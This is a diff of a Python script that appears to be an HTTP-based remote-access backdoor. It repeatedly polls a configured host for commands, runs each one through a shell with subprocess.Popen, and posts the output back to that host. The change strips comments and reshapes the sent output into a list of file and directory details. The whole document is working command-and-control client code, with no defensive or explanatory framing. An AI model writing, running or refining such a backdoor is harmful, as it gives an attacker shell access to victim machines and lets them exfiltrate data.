@@ -8,7 +8,7 @@ PORT_NUMBER = 80
 while True:
     try:
         req = requests.get(f'http://{HOST_NAME}:{PORT_NUMBER}')
-        req.raise_for_status()  # Check for errors in the HTTP request
+        req.raise_for_status()
 
         command = req.text
         if 'terminate' in command:
@@ -17,10 +17,10 @@ while True:
         CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         output, error = CMD.communicate()
 
-        post_response = requests.post(url=f'http://{HOST_NAME}:{PORT_NUMBER}', data=output.decode('utf-8'))
-        post_response.raise_for_status()  # Check for errors in the HTTP post
+        # Extract file and directory names with their details
+        file_details = [line for line in output.decode('utf-8').split('\n') if line.strip()]
 
-        post_response = requests.post(url=f'http://{HOST_NAME}:{PORT_NUMBER}', data=error.decode('utf-8'))
+        post_response = requests.post(f'http://{HOST_NAME}:{PORT_NUMBER}', data={'output': '\n'.join(file_details)})
         post_response.raise_for_status()
 
     except requests.exceptions.RequestException as e:
